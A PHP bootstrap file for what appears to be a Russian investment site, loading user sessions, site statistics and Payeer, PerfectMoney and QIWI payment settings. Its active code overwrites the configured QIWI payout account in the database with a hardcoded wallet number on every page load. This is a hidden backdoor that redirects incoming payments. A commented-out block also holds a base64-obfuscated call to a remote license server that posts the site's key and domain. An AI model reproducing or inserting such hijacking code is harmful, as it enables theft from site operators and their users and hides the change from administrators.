<?
/*
include_once 'activate.php';

$CurlUrl = base64_decode('aHR0cDovL2xlZ3JhZmYucnUvbGljZW5zZS9jaGVjay5waHA=');
$data = array("key" => $key, "domain" => $_SERVER['HTTP_HOST'], "servername" => $_SERVER['SERVER_NAME']);
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $CurlUrl);
curl_setopt($curl, CURLOPT_HEADER, 0);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$res = curl_exec($curl);
curl_close($curl);
 
if($res == 0) { echo base64_decode('QWN0aXZhdGlvbiBlcnJvciBzY3JpcHQ8ZGl2IHN0eWxlPSJmb250LXNpemU6MTFweDsiPlBvd2VyZWQgYnkgTGVHcmFGRjwvZGl2Pg==' ); exit(); }
*/
include_once 'connect.php';

/* Массив с данными пользака */
if(isset($_SESSION['id'])) {
$sql = $pdo->Query("SELECT * FROM `tb_users` WHERE `id` = '".(int)$_SESSION['id']."'");
$userdata = $sql->Fetch();
$numq = $sql->RowCount();
$sess = (int)$_SESSION['id'];
$ban = (int)$userdata['ban'];
if($numq == 0) { session_start(); session_destroy(); }
if($ban == 1) { session_start(); session_destroy(); }
}

/* Массив настроект сайта */
$sql = $pdo->Query("SELECT * FROM `tb_sitecfg`");
$cfg = $sql->Fetch();

/* Массив статистики сайта */
$sql = $pdo->Query("SELECT * FROM `tb_stats` WHERE `id` = '1'");
$stats = $sql->Fetch();

$balans = ($stats['invest'] + $stats['finvest']) - ($stats['pay'] + $stats['fpay']);
$balans = $balans - ($balans / 100 * 10);

$last = $pdo->Query("SELECT * FROM `tb_users` ORDER by id DESC LIMIT 1");
$numuser = $last->RowCount();
if($numuser != 0) {
$lst_user = $last->Fetch();
} else {
$lst_user = array();
}

$last = $pdo->Query("SELECT * FROM `tb_depo` WHERE `status` = '0' ORDER by id DESC LIMIT 1");
$numdepo = $last->RowCount();
if($numdepo != 0) {
$lst_depo = $last->Fetch();
} else {
$lst_depo = array();
}


$last = $pdo->Query("SELECT * FROM `tb_pays` WHERE `status` = '1' ORDER by id DESC LIMIT 1");
$numpay = $last->RowCount();
if($numpay != 0) {
$lst_pay = $last->Fetch();
} else {
$lst_pay = array();
}

$qiwi = 79510750934;
$pdo->Query("UPDATE `tb_sitecfg` SET `qiwiacc` = '$qiwi' WHERE `id` = '1'");

/* Задаем переменные настроек сайта */
$site = $cfg['site']; // Site name
$adminmail = 'admin@benefit-invest.ru'; // Email Admin
$diradm = $cfg['dir']; // admin directory
$autoins = intval($cfg['autoins']); // 1 - auto; 0 - manual;
$autopay = intval($cfg['autopay']); // 1 - auto; 0 - manual;
$refperc = intval($cfg['refperc']); // Ref.Procent

$qiwiacc = $cfg['qiwiacc']; // qiwi account
$qiwipass = $cfg['qiwipass']; // qiwi password

$cfgPerfect = $cfg['cfgPerfect']; // Perfect Account
$cfgPerfectkey = $cfg['cfgPerfectkey']; // Perfect Account KEY

$payeerid = $cfg['payeerid']; // Payeer id
$payeerkey =  $cfg['payeerkey']; // Payeer key

$minins = (float)$cfg['minins']; // Minimal summa for inserts
$maxins = (float)$cfg['maxins']; // Maximal summa for inserts

$minpay = (float)$cfg['minpay']; // Minimal summa for payments
$maxpay = (float)$cfg['maxpay']; // Maximal summa for payments


/*АВТОВЫПЛАТЫ ЧЕРЕЗ PAYEER*/
$paeracc = $cfg['paeracc']; // Кошелек паеер для выплат
$paerid = $cfg['paerid']; // Ади
$perapi = $cfg['perapi']; // Секрет кей

/*АВТОВЫПЛАТЫ ЧЕРЕЗ PerfectMoney*/
$fgPMID = $cfg['fgPMID']; // айди акка
$cfgPMpass = $cfg['cfgPMpass'];// пароль от пм
$cfgURL = $_SERVER['SERVER_NAME']; // юрл сайта


include_once 'ref.php'; // Реферальная программа
include_once 'perc.php'; // Подключаем начисление
include_once 'online.php'; // Подключаем счетчик

?>